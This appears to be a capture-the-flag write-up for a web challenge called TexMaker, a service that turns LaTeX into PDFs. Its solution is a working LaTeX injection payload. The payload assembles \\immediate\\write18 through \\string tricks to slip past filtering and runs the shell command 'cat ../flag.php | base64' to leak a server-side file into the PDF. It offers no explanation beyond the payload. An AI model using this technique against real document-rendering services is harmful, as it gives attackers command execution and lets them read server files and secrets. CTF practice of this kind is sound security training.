Web90: TexMaker
===================
Creating and using coperate templates is sometimes really hard. Luckily, we have a webinterace for creating PDF files. Some people doubt it's secure, but I reviewed the whole code and did not find any flaws. 


SOLUTION:

\def \imm {\string\immediate}
\def \wwrite {\string\write18}
\def \args {\string{cat ../flag.php | base64 > test.tex\string}}
\def \backslash {\string\in}
\def \iput {put}
\def \ls {\string{test.tex\string}}

\newwrite\outfile
\immediate\openout\outfile=cmd2.tex
\immediate\write\outfile{\imm\wwrite\args}
\immediate\write\outfile{\backslash\iput\ls}
\immediate\closeout\outfile

\newread\file
\openin\file=cmd2.tex
\loop\unless\ifeof\file
    \read\file to\fileline % Reads a line of the file into \fileline
    \fileline
\repeat
\closein\file

